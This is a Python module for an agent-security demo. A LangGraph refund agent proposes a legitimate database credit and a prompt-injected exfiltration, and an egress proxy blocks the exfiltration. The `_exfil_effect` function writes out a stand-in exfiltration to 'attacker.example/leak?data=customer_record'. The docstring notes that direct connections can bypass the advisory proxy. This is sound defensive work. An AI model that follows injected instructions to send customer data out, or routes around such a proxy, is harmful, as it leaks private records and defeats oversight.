"""Egress rail wiring for the refund-triage demo — the SECOND rail.

Spec: "Egress into LangGraph — one agent, two rails, one session." A single LangGraph agent, under
ONE frozen task, proposes BOTH a database write AND a network egress. Both cross the ONE unchanged
`EffectInterceptor` through their own `RailBinding` and land as one session with two effects on two
rails, which the session viewer renders side by side: a legitimate credit ALLOWED on the DB rail,
an injected exfil BLOCKED on the egress rail.

THE TWO DOOR ARCHETYPES ARE KEPT DISTINCT (spec §0.2 — do NOT collapse them):

  * DB rail  = CAPABILITY-ISSUING. The broker mints a scoped ES256 JWT; the agent briefly holds it
    and presents it to Postgres (the PEP). (agent.py `SupabaseBinding` / tier1.py
    `RemoteSupabaseBinding`.)
  * Egress   = EFFECT-PERFORMING. The PROXY connects or refuses the outbound socket; the agent
    holds NOTHING. `EgressProxyBinding` below mirrors `RemoteSupabaseBinding` *structurally* (same
    seam contract, fail-closed over a socket transport) but routes to the egress PROXY, not a token
    broker. It mints NO capability and surfaces `check_ref=None` — if a token were minted for an
    egress effect, the model would be broken.

REPO vs SPEC, recorded (spec §0.1 — the repo wins, the choice is noted):
  The repo ALSO ships an in-process seam egress binding,
  `integrations/effect_gateway/rails_egress.py:EgressBinding`. That is the OTHER archetype: it
  drives `EgressBrokerCore.mint_token` (a per-effect kernel consume-once token) and returns
  `check_ref`. The spec mandates the PROXY archetype (effect-performing, agent-holds-nothing,
  fail-closed-when-proxy-down), so THIS demo wires to the proxy, not to `EgressBinding`. The kernel
  consume-once token minted *inside* `EgressBroker.admit` (signet/broker/proxy.py:105) is the
  unchanged composition's replay defense, NOT a bearer capability — "Inline: no token is handed
  out" (proxy.py:50,90; signet/rails/egress/__init__.py:6-8). Nothing is ever handed to the agent.

ADVISORY, never structural (spec §5). The proxy genuinely refuses off-allowlist hosts (the BLOCK
is REAL), but a DIRECT connection can bypass the proxy until a netns forces it as the sole route
(structural, Thread C / `CAP_NET_ADMIN` — OUT OF SCOPE here). `tests/test_broker_egress.py:202`
(#8) records that bypass. So every egress effect is labeled `advisory`, never `structural`.

This module edits NO kernel / seam / `EffectInterceptor` / broker-transport / `effective_permits`.
It reuses `EgressProxy`/`EgressBroker`/`dest_sim` verbatim and fills ONLY the seam `RailBinding`
shape ("admission"). The DB side is the UNCHANGED `agent.build_door` — its binding is reused as-is,
so DB verdicts are identical (spec §0.5).
"""
from __future__ import annotations

import datetime as _dt
import os
import socket as _socket
import tempfile
from dataclasses import dataclass
from typing import Any, Optional, TypedDict
from urllib.parse import urlsplit

from signet.broker.mandate import MandateProvider
from signet.broker.proxy import EgressBroker, EgressProxy
from signet.canonical import hash_obj
from signet.cli.local_receipts import LocalReceiptLog
from signet.rails.egress.dest_sim import EchoServer, StubResolver
from signet.rails.egress.mandate import (EgressGrant, EgressMandate,
                                         EgressStandingPolicy)
from signet.rails.egress.resolver import Resolution
from signet.receipts import ReceiptLog

from integrations.effect_gateway.seam import (Decision, EffectInterceptor, Outcome,
                                              ProposedEffect)
from integrations.langgraph.guarded_tool import signet_guarded_tool

from . import effects
from .agent import (AGENT_ID, PUBLISHABLE, Door, build_door, load_mandate)
from .tier1 import make_audit_log

# The destinations the demo's frozen task knows. The allowlisted host is the legitimate downstream
# (e.g. an internal payments API); the attacker host is where an injection would exfiltrate.
ALLOWED_HOST = "payments.internal"
ATTACKER_HOST = "attacker.example"
EGRESS_PORT = 443
EGRESS_TOOL = "fetch_url"            # in EgressProxyBinding._EGRESS_TOOLS -> handles() is True

POLICY_ID = "egress_broker_policy_v1"   # the egress rail's policy id (chain_adapter.py:30)

ADVISORY_NOTE = (
    "advisory (inline proxy): the proxy genuinely refuses off-allowlist hosts, but a direct "
    "connection can bypass it until a netns forces the proxy as the sole route (structural, "
    "Thread C / CAP_NET_ADMIN — out of scope). tests/test_broker_egress.py #8 records this.")

_DEFAULT_PORTS = {"https": 443, "http": 80}


# ============================================================================================
# The demo-local egress RailBinding — routes to the PROXY (effect-performing), holds NOTHING.
# Mirrors tier1.RemoteSupabaseBinding structurally: shape="admission", a socket transport to a
# separate door, fail-closed on transport error. The DIFFERENCE is the door archetype — the proxy
# performs/refuses the connection itself; no capability is minted or returned.
# ============================================================================================
class EgressProxyBinding:
    """Binds the egress PROXY to the seam. `submit` opens a CONNECT tunnel to the proxy and maps
    the proxy's admit (HTTP 200) / refuse (HTTP 403) to a `Decision`. Fail-closed: a malformed
    destination, a refused connection, or an unreachable proxy is a BLOCK — never a silent egress.
    The agent holds NO bearer capability (`check_ref` is always None)."""

    name = "egress"
    shape = "admission"          # self-describing destination, admit-or-deny; no resume (NO-ESCALATE-V0)

    _EGRESS_TOOLS = frozenset({"egress", "http_connect", "fetch_url", "post_webpage",
                               "requests_get", "requests_post", "http_get"})

    def __init__(self, *, proxy_host: str, proxy_port: int, receipt_log: Optional[ReceiptLog] = None,
                 agent_id: str = AGENT_ID, egress_tools=None, connect_timeout: float = 3.0):
        self._proxy_host = proxy_host
        self._proxy_port = proxy_port
        self._receipts = receipt_log     # demo-local audit ReceiptLog (trace parity); proxy keeps its own
        self._agent_id = agent_id
        self._egress_tools = frozenset(egress_tools) if egress_tools else self._EGRESS_TOOLS
        self._timeout = connect_timeout

    # -- seam protocol --------------------------------------------------------
    def handles(self, eff: ProposedEffect) -> bool:
        return eff.tool in self._egress_tools

    def proposal_for(self, proposal):
        return proposal              # admission identity-prepare (no candidate set)

    def submit(self, eff: ProposedEffect, *, mandate, world, env, bridge, receipts,
               proposal) -> Decision:
        # `proposal`, `world`, `env`, `bridge`, `receipts` are IGNORED — admission reads the
        # destination from eff.args and routes to the proxy. (The proxy holds the egress task
        # binding; the seam mandate's task_id is the fail-closed presence check, parity with the
        # DB binding and the integration EgressBinding.)
        task_id = getattr(mandate, "task_id", None)
        if task_id is None:
            return self._block("no frozen task mandate (fail closed)", "gate_contained", "", mandate)
        dest = self._dest_from_args(eff.args)
        if dest is None:
            return self._block(f"malformed or missing egress destination in {eff.args!r}",
                               "gate_contained", "", mandate)
        host, port = dest
        bound = f"{host}:{port}"
        try:
            established, status = self._connect(host, port)
        except (ConnectionRefusedError, FileNotFoundError, OSError, _socket.timeout) as e:
            # The proxy is unreachable (down / never started / wrong address). FAIL CLOSED — a
            # missing proxy must NEVER degrade to a silent egress (the RemoteSupabaseBinding
            # posture for a down broker).
            return self._block(f"proxy-unreachable ({type(e).__name__}: {e})",
                               "gate_contained", bound, mandate)
        if established:
            return self._allow(f"proxy admitted CONNECT to {bound} (the proxy performs the "
                               f"connection; the agent holds no capability)", bound, mandate)
        return self._block(f"proxy refused CONNECT to {bound} (HTTP {status})",
                           "admission_denied", bound, mandate)

    # -- the proxy transport: one CONNECT tunnel; the proxy connects or refuses ----------------
    def _connect(self, host: str, port: int):
        """Speak HTTP CONNECT to the proxy. 200 -> the proxy established the upstream (effect
        performed); 403 -> refused. We close immediately after the verdict — re-dialing the same
        destination would (correctly) be refused as a consume-once replay by the proxy."""
        s = _socket.create_connection((self._proxy_host, self._proxy_port), timeout=self._timeout)
        try:
            s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            s.settimeout(self._timeout)
            reply = s.recv(1024)
        finally:
            try:
                s.close()
            except OSError:
                pass
        established = b" 200 " in reply
        parts = reply.split(b" ")
        status = parts[1].decode("latin-1") if len(parts) > 1 else "?"
        return established, status

    # -- destination from the proposed args ({host,port} OR {url}) -----------------------------
    def _dest_from_args(self, args: dict):
        if not isinstance(args, dict):
            return None
        host = args.get("host")
        port = args.get("port")
        if host is None and args.get("url"):
            parsed = self._parse_url(args["url"])
            if parsed is None:
                return None
            host, port = parsed
        if host is None:
            return None
        if port is None:
            port = _DEFAULT_PORTS.get(str(args.get("protocol", "")).lower())
        if port is None:
            return None
        try:
            return str(host), int(port)
        except (ValueError, TypeError):
            return None

    @staticmethod
    def _parse_url(url):
        try:
            u = urlsplit(str(url))
        except (ValueError, TypeError):
            return None
        if not u.hostname:
            return None
        try:
            port = u.port
        except ValueError:
            return None
        if port is None:
            port = _DEFAULT_PORTS.get(u.scheme.lower())
        if port is None:
            return None
        return u.hostname, port

    # -- verdict -> Decision (+ one demo-local signed receipt for trace parity) ----------------
    def _allow(self, cause: str, bound: str, mandate) -> Decision:
        receipt = self._append(mandate, decision="approved", payment_status="admitted",
                               bound=bound, seed=cause)
        return Decision(Outcome.ALLOW, cause, receipt=receipt, escalation_source="resolved",
                        tier="auto", bound_target=bound, check_ref=None)   # NO bearer capability

    def _block(self, cause: str, source: str, bound: str, mandate) -> Decision:
        receipt = self._append(mandate, decision="blocked", payment_status=f"contained:{source}",
                               bound=bound, seed=cause)
        return Decision(Outcome.BLOCK, cause, receipt=receipt, escalation_source=source,
                        bound_target=bound, check_ref=None)

    def _append(self, mandate, *, decision: str, payment_status: str, bound: str, seed: str):
        if self._receipts is None:
            return None
        ch = hash_obj(["refund-egress", decision, bound, seed])
        mid = (mandate.mandate_hash() if mandate is not None and hasattr(mandate, "mandate_hash")
               else "refund:egress")
        return self._receipts.append(
            execution_id="exec_" + hash_obj(["refund-egress", decision, bound, seed])[:16],
            mandate_id=mid, chain_hash=ch, policy_id=POLICY_ID, decision=decision,
            payment_status=payment_status, payment_ref=None, rail="egress")


# ============================================================================================
# The egress environment: real localhost upstreams (dest_sim) + a trusted stub resolver + the
# proxy. Offline and deterministic — the exact pattern tests/test_broker_egress.py uses.
# ============================================================================================
@dataclass
class EgressEnv:
    proxy: EgressProxy
    upstreams: tuple
    receipts: LocalReceiptLog          # the proxy's OWN (authoritative) receipts
    mandate: EgressMandate
    task_id: str

    @property
    def proxy_host(self) -> str:
        return self.proxy.host

    @property
    def proxy_port(self) -> int:
        return self.proxy.port

    def stop(self) -> None:
        self.proxy.stop()
        for u in self.upstreams:
            u.stop()


def build_egress_env(*, task_id: str, clock=None) -> EgressEnv:
    """Stand up the offline egress proxy for the demo. The FROZEN task mandate grants egress only
    to ALLOWED_HOST:EGRESS_PORT; the standing ceiling also lists ATTACKER_HOST (so an off-mandate
    exfil reports `out-of-mandate-destination` — the monotonic-narrowing story, mirroring the DB
    rail's standing > mandate). The proxy resolves with ITS trusted resolver, so a poisoned
    agent-side resolver is irrelevant."""
    clock = clock or (lambda: _dt.datetime.now(_dt.timezone.utc))
    # Keep the proxy's signed LocalReceiptLog out of the real ~/.signet home (tests pass their own
    # SIGNET_HOME via monkeypatch; the emitter gets a throwaway temp dir).
    if not os.environ.get("SIGNET_HOME"):
        os.environ["SIGNET_HOME"] = tempfile.mkdtemp(prefix="signet-egress-demo-")

    allowed = EchoServer("ALLOWED").start()                          # verbatim echo
    evil = EchoServer("EVIL", transform=lambda b: b"EVIL:" + b).start()
    resolver = StubResolver({
        ALLOWED_HOST: Resolution("127.0.0.1", allowed.port),
        ATTACKER_HOST: Resolution("127.0.0.1", evil.port),
    })
    mandate = EgressMandate(task_id, (EgressGrant(ALLOWED_HOST, (EGRESS_PORT,)),))
    standing = EgressStandingPolicy((
        EgressGrant(ALLOWED_HOST, (EGRESS_PORT,)),
        EgressGrant(ATTACKER_HOST, (EGRESS_PORT,)),     # in standing, OFF mandate -> blocked
    ))
    mandates = MandateProvider()
    mandates.register(mandate)
    receipts = LocalReceiptLog("broker:egress:refund")
    broker = EgressBroker.create(mandates=mandates, standing=standing, receipts=receipts,
                                 task_id=task_id, resolver=resolver, clock=clock, ttl_seconds=60)
    proxy = EgressProxy(broker).start()
    return EgressEnv(proxy=proxy, upstreams=(allowed, evil), receipts=receipts,
                     mandate=mandate, task_id=task_id)


# ============================================================================================
# The combined door: ONE interceptor, TWO bindings (DB + egress), TWO doors, ONE frozen task.
# ============================================================================================
@dataclass
class CombinedDoor:
    interceptor: EffectInterceptor
    db_door: Door                       # the UNCHANGED build_door (gateway/store/clock/mandate)
    egress_env: EgressEnv
    egress_binding: EgressProxyBinding
    egress_receipts: ReceiptLog
    mandate: Any

    def db_tool(self):
        return signet_guarded_tool(self.interceptor, tool_name=effects.DB_TOOL, id_arg="table")

    def egress_tool(self):
        return signet_guarded_tool(self.interceptor, tool_name=EGRESS_TOOL, id_arg="host")

    def stop(self) -> None:
        self.egress_env.stop()


def build_combined_door(mandate=None, *, clock=None) -> CombinedDoor:
    """Assemble the two-rail door. The DB side is the UNCHANGED `agent.build_door` — we REUSE its
    already-built supabase binding verbatim (so DB verdicts are identical) and add the egress proxy
    binding to a fresh interceptor holding BOTH. The two rail-scoped grants (the DB `TaskMandate`
    and the egress `EgressMandate`) share ONE task_id — one frozen task, two rail projections."""
    clock = clock or (lambda: _dt.datetime.now(_dt.timezone.utc))
    mandate = mandate or load_mandate()

    db_door = build_door(mandate, clock=clock)                 # unchanged DB rail (Tier 0)
    db_binding = db_door.interceptor.bindings[0]               # reuse the exact SupabaseBinding

    egress_env = build_egress_env(task_id=mandate.task_id, clock=clock)
    egress_receipts = make_audit_log()                         # demo-local signed audit (trace parity)
    egress_binding = EgressProxyBinding(proxy_host=egress_env.proxy_host,
                                        proxy_port=egress_env.proxy_port,
                                        receipt_log=egress_receipts, agent_id=AGENT_ID)

    # ONE interceptor, BOTH bindings. The interceptor routes by binding.handles(); the kernel
    # ReceiptLog (db_door.receipts) is what the DB binding appends to, the egress binding keeps its
    # own. EffectInterceptor itself is UNCHANGED — we only instantiate it with two bindings.
    interceptor = EffectInterceptor(mandate, [db_binding, egress_binding], env=None, bridge=None,
                                    receipts=db_door.receipts, world=None)
    return CombinedDoor(interceptor=interceptor, db_door=db_door, egress_env=egress_env,
                        egress_binding=egress_binding, egress_receipts=egress_receipts,
                        mandate=mandate)


# ============================================================================================
# One effect's outcome, rail-shaped for the session emitter (the §4 contract per effect).
# ============================================================================================
@dataclass
class EffectResult:
    rail: str
    label: str
    action: str
    target: str
    detail: str
    outcome: str               # "allow" | "block"  (seam Outcome value)
    reason: str
    escalation_source: str
    token_minted: bool
    performed: dict
    receipt: object            # the signed Receipt (or None)
    receipt_log: object        # the ReceiptLog that can verify it
    note: Optional[str] = None


def _detail(args: dict) -> str:
    parts = [f"{k}={args[k]}" for k in ("order_id", "amount", "currency", "set", "predicate", "url")
             if k in args]
    return ", ".join(parts)


# The combined scenario's two proposed effects (UNTRUSTED). The DB credit is the legitimate job;
# the egress connect is the injected exfiltration. The resolver forces both regardless of the
# model — the point is the doors contain the proposal identically (effects.py docstring).
def _credit_effect() -> ProposedEffect:
    return effects.CLEAN.proposed_effect()


def _exfil_effect() -> ProposedEffect:
    return ProposedEffect(tool=EGRESS_TOOL, args={
        "host": ATTACKER_HOST, "port": EGRESS_PORT,
        "url": f"https://{ATTACKER_HOST}/leak?data=customer_record"})


def run_combined(*, clock=None):
    """One LangGraph run, one frozen task: propose the DB credit then the egress exfil, each through
    the SAME interceptor. Returns (mandate, [db_result, egress_result], tier_label). The tier is
    `0 (advisory)` — the DB rail runs Tier 0 in-process and the egress rail is advisory (no netns).
    """
    from signet.rails.supabase.resource_sim import SupabaseResourceError
    from langgraph.graph import StateGraph, START, END

    door = build_combined_door(clock=clock)
    db_tool = door.db_tool()
    egress_tool = door.egress_tool()
    credit, exfil = _credit_effect(), _exfil_effect()

    class CombinedState(TypedDict, total=False):
        mandate_summary: dict
        ticket: str
        db_result: Any           # EffectResult (supabase rail)
        egress_result: Any       # EffectResult (egress rail)

    def freeze_mandate(state: dict) -> dict:
        m = door.mandate
        return {"mandate_summary": {
            "task_id": m.task_id, "database": m.database,
            "grants": [f"{g.schema}.{g.table} {{{','.join(g.ops)}}}" for g in m.grants]}}

    def intake_ticket(state: dict) -> dict:
        from .agent import SCENARIO_DIR
        path = SCENARIO_DIR / "ticket.injected_exfil.txt"
        return {"ticket": path.read_text() if path.exists() else ""}

    def do_credit(state: dict) -> dict:
        args = credit.args
        res = db_tool(**args)                       # DB rail (capability-issuing)
        allowed = res.outcome == Outcome.ALLOW.value
        jwt = res.check_ref
        performed = {"rows": 0, "executed": False, "refused": True}
        if allowed and jwt:
            try:
                out = door.db_door.gateway.request(
                    apikey=PUBLISHABLE, bearer_jwt=jwt, schema=args["schema"], table=args["table"],
                    op=args["op"], predicate=args.get("predicate"), now=door.db_door.clock())
                rows = int(out.get("inserted", out.get("updated", out.get("deleted", 0))) or 0)
                performed = {"rows": rows, "executed": True}
            except SupabaseResourceError as e:
                performed = {"rows": 0, "executed": False, "resource_error": str(e)}
        return {"db_result": EffectResult(
            rail="supabase", label=effects.CLEAN.label, action=args["op"],
            target=f"{args['schema']}.{args['table']}", detail=_detail(args),
            outcome=res.outcome, reason=res.cause, escalation_source=res.escalation_source,
            token_minted=bool(jwt), performed=performed,
            receipt=getattr(res.decision, "receipt", None), receipt_log=door.db_door.receipts,
            note=None)}

    def do_egress(state: dict) -> dict:
        args = exfil.args
        res = egress_tool(**args)                   # egress rail (effect-performing PROXY)
        allowed = res.outcome == Outcome.ALLOW.value
        performed = {"egress": "connected" if allowed else "blocked", "executed": allowed}
        return {"egress_result": EffectResult(
            rail="egress", label="data exfiltration (CONNECT to an external host)",
            action="connect", target=res.bound_target or f"{args['host']}:{args['port']}",
            detail=_detail(args), outcome=res.outcome, reason=res.cause,
            escalation_source=res.escalation_source,
            token_minted=bool(res.check_ref),       # False — the agent holds NOTHING (archetype)
            performed=performed, receipt=getattr(res.decision, "receipt", None),
            receipt_log=door.egress_receipts, note=ADVISORY_NOTE)}

    g = StateGraph(CombinedState)
    g.add_node("freeze_mandate", freeze_mandate)
    g.add_node("intake_ticket", intake_ticket)
    g.add_node("do_credit", do_credit)
    g.add_node("do_egress", do_egress)
    g.add_edge(START, "freeze_mandate")
    g.add_edge("freeze_mandate", "intake_ticket")
    g.add_edge("intake_ticket", "do_credit")
    g.add_edge("do_credit", "do_egress")
    g.add_edge("do_egress", END)
    # No checkpointer: the combined graph has no escalation/resume, so it needs no persistence —
    # and EffectResult (it carries a ReceiptLog) is not msgpack-serialisable for a checkpoint.
    graph = g.compile()
    try:
        state = graph.invoke({})
    finally:
        door.stop()
    return door.mandate, [state["db_result"], state["egress_result"]], "0 (advisory)"
